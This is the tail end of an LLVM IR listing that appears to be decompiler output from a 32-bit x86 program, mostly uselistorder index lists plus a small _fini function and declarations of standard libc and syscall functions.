884, 885, 886, 426, 15, 14, 16, 13, 846, 427, 135, 132, 134, 130, 131, 133, 280, 281, 430, 429, 428, 431, 169, 432, 63, 433, 33, 435, 434, 21, 437, 436, 146, 439, 438, 95, 440, 207, 441, 101, 442, 208, 443, 209, 444, 210, 445, 447, 446, 10, 449, 448, 70, 451, 450, 86, 452, 83, 100, 454, 453, 82, 455, 459, 458, 457, 456, 81, 888, 889, 890, 462, 461, 460, 197, 199, 198, 891, 282, 464, 463, 466, 465, 200, 283, 334, 620, 4, 472, 471, 470, 469, 468, 467, 79, 80, 894, 475, 474, 473, 78, 76, 77, 304, 476, 695, 696, 697, 698, 477, 141, 140, 142, 139, 143, 284, 285, 335, 235, 336, 337, 236, 338, 478, 479, 144, 145, 647, 622, 226, 648, 339, 649, 362, 480, 104, 103, 102, 105, 481, 118, 115, 114, 116, 120, 119, 117, 125, 122, 124, 126, 121, 123, 305, 483, 482, 306, 484, 307, 485, 308, 488, 487, 486, 340, 491, 490, 489, 201, 309, 824, 825, 826, 492, 112, 819, 820, 234, 821, 822, 823, 129, 127, 128, 341, 818, 255, 202, 203, 204, 205, 310, 286, 650, 651, 652, 653, 495, 494, 493, 137, 136, 138, 311, 791, 792, 793, 794, 795, 796, 797, 798, 799, 256, 800, 801, 802, 803, 804, 289, 805, 806, 217, 290, 807, 808, 809, 810, 287, 288, 811, 812, 813, 498, 497, 496, 164, 163, 162, 166, 165, 342, 499, 500, 501, 502, 503, 504, 505, 506, 507, 827, 5, 828, 312, 237, 313, 832, 6, 512, 511, 510, 509, 508, 45, 46, 513, 514, 517, 516, 515, 47, 518, 714, 715, 847, 848, 367, 519, 75, 849, 829, 830, 831, 521, 520, 99, 98, 97, 667, 668, 523, 522, 56, 55, 54, 895, 896, 524, 51, 50, 52, 893, 525, 58, 57, 59, 526, 527, 760, 761, 762, 257, 53, 314, 315, 316, 759, 528, 317, 318, 758, 258, 7, 530, 529, 206, 319, 531, 147, 320, 532, 152, 291, 533, 49, 48, 850, 851, 623, 260, 852, 853, 854, 855, 856, 858, 859, 860, 261, 861, 862, 343, 259, 863, 262, 864, 865, 866, 857, 537, 536, 535, 534, 37, 39, 38, 34, 35, 36, 40, 867, 538, 151, 148, 150, 149, 263, 539, 868, 869, 541, 540, 41, 42, 870, 871, 624, 625, 292, 872, 293, 873, 874, 875, 264, 876, 321, 877, 544, 543, 542, 28, 32, 30, 29, 31, 265, 322, 8, 323, 545, 546, 154, 153, 887, 548, 547, 214, 215, 294, 892, 549, 213, 324, 216, 325, 763, 764, 765, 766, 767, 768, 769, 770, 771, 553, 552, 551, 550, 22, 556, 555, 554, 557, 326, 744, 745, 327, 328, 746, 559, 558, 561, 560, 27, 562, 69, 563, 159, 565, 564, 161, 566, 113, 567, 158, 568, 211, 569, 571, 570, 212, 572, 160, 654, 655, 656, 657, 658, 659, 267, 660, 661, 662, 295, 266, 345, 268, 663, 664, 344, 665, 666, 626, 582, 581, 580, 579, 578, 577, 576, 575, 574, 573, 363, 168, 346, 583, 347, 348, 349, 350, 584, 589, 588, 587, 586, 585, 591, 590, 669, 227, 670, 671, 672, 673, 674, 675, 676, 677, 678, 364, 592, 593, 218, 679, 221, 228, 680, 681, 682, 683, 222, 684, 685, 686, 687, 688, 689, 690, 691, 692, 594, 693, 595, 351, 596, 599, 598, 597, 694, 600, 699, 352, 627, 602, 601, 269, 700, 628, 353, 354, 608, 607, 606, 605, 604, 603, 701, 702, 703, 610, 609, 365, 299, 704, 9, 705, 611, 613, 612, 330, 878, 879, 331, 880, 881, 332, 333, 882, 883, 614, 897, 616, 615, 618, 617, 619 }
  uselistorder label %dec_label_pc_8050b70, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8050b87 = load i32, i32* @ebx, align 4
  %v1_8050b88 = call i32 @__get_pc_thunk_bx(i32 %v0_8050b87)
  store i32 %v1_8050b88, i32* @eax, align 4
  %v0_8050b93 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8050b93

; uselistorder directives
  uselistorder i32* @eax, { 11, 51, 92, 2, 93, 94, 1, 95, 0, 50, 91, 96, 52, 97, 56, 57, 59, 12, 58, 98, 103, 99, 100, 101, 102, 3, 4, 153, 154, 164, 165, 104, 36, 34, 111, 35, 112, 113, 114, 115, 38, 39, 131, 132, 40, 133, 41, 134, 42, 43, 44, 135, 136, 137, 138, 45, 139, 140, 141, 142, 46, 124, 167, 168, 53, 169, 170, 172, 54, 173, 5, 171, 8, 10, 166, 63, 13, 60, 61, 87, 62, 148, 150, 151, 149, 64, 65, 143, 144, 146, 147, 145, 152, 47, 6, 120, 121, 122, 49, 123, 116, 117, 118, 119, 66, 67, 125, 126, 68, 69, 155, 157, 156, 158, 159, 161, 55, 160, 127, 128, 37, 129, 130, 105, 31, 32, 106, 107, 108, 109, 33, 110, 14, 70, 71, 72, 73, 74, 15, 75, 76, 16, 77, 17, 78, 80, 81, 79, 82, 83, 84, 85, 18, 19, 86, 20, 21, 22, 23, 24, 25, 26, 27, 28, 88, 29, 89, 30, 90, 48, 174, 162, 163, 7, 9 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1055, 13, 14, 15, 86, 51, 862, 1056, 1059, 1057, 1058, 863, 1060, 1218, 1219, 231, 1071, 1063, 1065, 1066, 19, 39, 1067, 1068, 1069, 864, 1070, 95, 96, 97, 1061, 1062, 104, 1072, 1073, 1075, 1076, 1074, 1077, 203, 1078, 1079, 1080, 1081, 1082, 1083, 106, 107, 865, 243, 244, 952, 866, 953, 105, 954, 955, 956, 957, 958, 959, 54, 55, 960, 961, 962, 860, 963, 53, 867, 52, 868, 108, 109, 869, 16, 870, 964, 17, 871, 110, 245, 872, 873, 111, 874, 1086, 875, 1084, 190, 1085, 246, 247, 112, 113, 40, 876, 1087, 1088, 1089, 1090, 1091, 248, 877, 878, 114, 1092, 20, 56, 975, 81, 82, 879, 1093, 57, 880, 21, 881, 1220, 249, 1094, 1095, 1096, 1221, 1222, 12, 204, 116, 115, 1223, 1224, 205, 1225, 882, 1097, 1098, 883, 1226, 884, 1227, 1228, 1229, 1230, 1099, 1441, 117, 885, 0, 965, 1, 1442, 1443, 1444, 1445, 1446, 1448, 1447, 118, 250, 1106, 1102, 1103, 1104, 1105, 89, 22, 1119, 1120, 1133, 1134, 1135, 1136, 1142, 1143, 1144, 1145, 1137, 1138, 1139, 1140, 1141, 58, 59, 886, 1146, 1147, 119, 887, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1165, 1166, 1167, 120, 1182, 1183, 121, 1184, 1185, 1186, 60, 90, 206, 98, 888, 91, 1231, 122, 1232, 23, 92, 83, 1233, 177, 123, 1234, 2, 1235, 1107, 1108, 1115, 251, 1116, 889, 1236, 252, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 124, 890, 1244, 1245, 1246, 1247, 125, 1248, 891, 174, 253, 126, 892, 893, 894, 127, 1249, 207, 1250, 1251, 1252, 1253, 208, 239, 240, 1254, 1255, 1256, 1257, 1258, 1259, 895, 209, 1260, 84, 896, 1261, 128, 210, 211, 1262, 1263, 897, 1264, 1265, 1266, 1267, 78, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 3, 178, 1268, 93, 1269, 179, 898, 899, 1270, 129, 1271, 1460, 1461, 1187, 1188, 1189, 254, 1190, 1462, 99, 212, 1463, 1191, 976, 1464, 966, 1465, 1466, 1467, 967, 1468, 968, 1469, 1470, 1471, 1156, 1472, 130, 1473, 1482, 1483, 24, 900, 4, 103, 901, 902, 1489, 1493, 180, 1494, 131, 843, 255, 256, 1488, 5, 1474, 1475, 1476, 132, 950, 859, 133, 903, 1495, 6, 213, 214, 134, 1496, 1497, 135, 136, 1499, 1498, 1500, 1501, 257, 844, 1502, 1504, 1503, 1505, 1506, 1507, 137, 904, 1481, 1032, 1033, 1034, 1035, 905, 906, 1036, 1037, 1038, 215, 138, 139, 140, 258, 259, 85, 260, 1509, 1508, 261, 1510, 141, 142, 907, 969, 908, 970, 143, 909, 144, 910, 977, 61, 978, 979, 980, 981, 982, 7, 911, 1049, 912, 971, 972, 973, 974, 913, 145, 1484, 845, 146, 216, 1485, 1487, 1486, 1200, 217, 1201, 1194, 1195, 1196, 218, 1197, 1198, 1199, 262, 1192, 263, 1193, 264, 914, 983, 100, 984, 219, 915, 985, 916, 917, 265, 846, 918, 266, 847, 147, 919, 1168, 1169, 148, 149, 267, 848, 102, 43, 44, 1170, 1171, 1172, 1173, 1174, 1175, 150, 151, 268, 849, 101, 1176, 181, 1177, 87, 1178, 1179, 1181, 920, 1180, 1202, 921, 220, 1203, 922, 1204, 1205, 1206, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 221, 1490, 1492, 1064, 8, 152, 1272, 1273, 269, 1274, 153, 923, 1275, 182, 1276, 62, 1207, 924, 222, 223, 154, 1277, 1278, 1279, 155, 1117, 63, 925, 1109, 926, 1114, 1113, 183, 927, 928, 1110, 1112, 1111, 184, 929, 986, 1118, 987, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 156, 930, 1292, 224, 1293, 1294, 1295, 1296, 1297, 25, 26, 931, 198, 199, 1298, 1299, 1300, 1301, 157, 1302, 1303, 1304, 932, 1305, 27, 28, 158, 933, 1306, 1307, 1308, 1311, 1309, 1310, 29, 45, 64, 1312, 1313, 1314, 1315, 241, 1316, 1317, 159, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 161, 1326, 1327, 1328, 934, 1329, 1330, 185, 186, 1331, 1332, 1333, 162, 160, 1334, 163, 1335, 1336, 935, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 164, 936, 937, 165, 1356, 1357, 1358, 938, 939, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 940, 941, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 942, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 225, 943, 226, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 227, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 30, 65, 66, 67, 68, 1415, 1416, 1417, 1418, 1419, 1420, 166, 1421, 944, 1422, 1423, 1424, 1425, 850, 1426, 1427, 1428, 1429, 1430, 1431, 167, 945, 88, 41, 79, 1344, 187, 1477, 1478, 188, 1480, 1479, 69, 270, 946, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 228, 1131, 168, 947, 948, 1132, 1432, 169, 1100, 949, 1101, 1459, 170, 1039, 1044, 1449, 1491, 988, 1450, 989, 171, 990, 991, 992, 993, 994, 995, 997, 998, 996, 999, 1053, 1164, 175, 272, 1000, 1001, 31, 32, 70, 192, 80, 176, 232, 1002, 33, 46, 1003, 271, 851, 34, 47, 233, 234, 235, 1004, 852, 273, 853, 1005, 1006, 1007, 1009, 191, 1008, 861, 1010, 274, 275, 276, 277, 1011, 1012, 854, 278, 279, 280, 281, 282, 283, 1013, 1014, 855, 1015, 1016, 1017, 1018, 1019, 1020, 94, 1021, 194, 74, 73, 9, 229, 1022, 1023, 193, 72, 71, 10, 230, 1024, 197, 195, 196, 35, 48, 1025, 286, 287, 1026, 285, 284, 288, 1027, 289, 200, 290, 1028, 856, 1029, 42, 1031, 36, 49, 1030, 201, 202, 292, 293, 291, 857, 858, 1040, 294, 1041, 1042, 1043, 172, 296, 297, 236, 1045, 298, 1046, 237, 295, 238, 299, 1047, 1048, 300, 301, 1050, 1051, 37, 75, 76, 18, 50, 1052, 38, 1054, 302, 1217, 1433, 1434, 1435, 242, 1436, 1437, 77, 11, 1438, 1439, 1440, 173, 951, 189, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518 }
  uselistorder i32* @ebx, { 38, 149, 150, 359, 360, 151, 153, 156, 157, 158, 159, 160, 154, 152, 155, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 182, 1, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 195, 193, 194, 196, 197, 65, 66, 361, 362, 363, 198, 2, 199, 200, 201, 3, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 364, 365, 366, 367, 213, 214, 215, 216, 458, 459, 460, 461, 462, 5, 260, 224, 222, 223, 225, 228, 226, 227, 229, 230, 231, 4, 232, 274, 275, 276, 277, 278, 279, 280, 6, 281, 7, 282, 283, 284, 285, 286, 287, 288, 289, 292, 293, 294, 295, 296, 299, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 233, 234, 235, 236, 8, 245, 9, 246, 247, 368, 369, 370, 371, 10, 372, 373, 374, 11, 375, 12, 376, 377, 378, 379, 380, 468, 469, 13, 470, 471, 474, 475, 381, 476, 477, 478, 479, 480, 328, 14, 329, 330, 481, 482, 483, 331, 332, 77, 78, 79, 484, 51, 485, 486, 487, 488, 489, 490, 52, 491, 492, 493, 494, 495, 290, 291, 300, 301, 302, 496, 497, 498, 32, 33, 507, 508, 509, 516, 517, 518, 519, 29, 15, 27, 510, 513, 514, 515, 499, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 506, 128, 129, 549, 550, 551, 552, 553, 554, 555, 556, 53, 54, 55, 56, 57, 80, 81, 16, 0, 82, 134, 135, 59, 83, 84, 85, 58, 60, 136, 137, 138, 511, 512, 61, 62, 63, 64, 333, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 336, 337, 17, 338, 339, 334, 335, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 18, 97, 98, 99, 100, 101, 102, 103, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 30, 314, 315, 316, 317, 318, 19, 319, 320, 321, 322, 323, 324, 325, 326, 327, 350, 351, 352, 353, 354, 355, 20, 356, 357, 358, 520, 521, 522, 523, 524, 525, 526, 530, 531, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 248, 249, 250, 251, 252, 253, 254, 255, 237, 240, 241, 242, 243, 244, 238, 239, 104, 105, 106, 107, 256, 257, 258, 259, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 426, 427, 21, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 22, 441, 442, 443, 444, 445, 446, 34, 35, 36, 37, 421, 423, 422, 424, 425, 500, 23, 501, 502, 503, 504, 31, 24, 28, 505, 532, 533, 534, 535, 536, 261, 262, 263, 264, 265, 266, 267, 25, 268, 26, 269, 270, 271, 272, 273, 447, 448, 449, 217, 218, 219, 220, 221, 472, 473, 130, 131, 132, 133, 463, 464, 465, 527, 528, 529, 108, 109, 466, 467, 110, 111, 112, 113, 114, 115, 116, 117, 118, 147, 148, 297, 298, 119, 120, 121, 122, 123, 124, 125, 126, 127, 139, 140, 141, 142, 143, 144, 145, 146, 450, 451, 452, 453, 454, 455, 456, 457 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
